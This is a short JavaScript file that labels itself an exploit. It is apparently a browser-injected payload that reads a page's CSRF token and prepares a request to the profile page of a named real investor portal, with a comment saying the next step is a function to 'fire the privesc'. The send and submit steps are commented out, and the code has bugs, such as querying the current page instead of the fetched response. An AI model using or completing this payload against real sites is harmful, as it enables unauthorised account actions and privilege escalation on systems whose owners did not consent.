//BEGIN
console.log("beginning exploit");
console.log("GET URL is: " + GET_URL);
console.log("might need to put the entire https:// URL here if this fails..");


var xyz = document.querySelector('input[name=_token]').value;
console.log("Custom Payload has gained token, CSRF Token is: " + xyz);

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = "document";
    // true on the end of here makes the call asynchronous
    console.log("making the call..");
    xhr.open("GET", GET_URL, true);
    console.log("reading response...");
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            // Get the document from the response
            page = xhr.response;
            // Get the input element
            console.log("extracting token value");
            console.log("this may be problematic if so, likely assigned the wrong input element...");
            var input = document.querySelector('input[name=_token]').value;
            // Show the token
            console.log("aaaand:");
            console.log("The token is: " + input.value);
            // Use the token to submit the form
            //submitFormWithTokenJS(input.value);
        }
    };
    // Make the request
    //xhr.send(null);
}
console.log("Done! Verify extracted token value is correct, if so; write xhr function to fire the privesc");
var GET_URL="https://investorportal.ispt.net.au/my-profile";
getTokenJS();
console.log("end of exploit");
//EOF
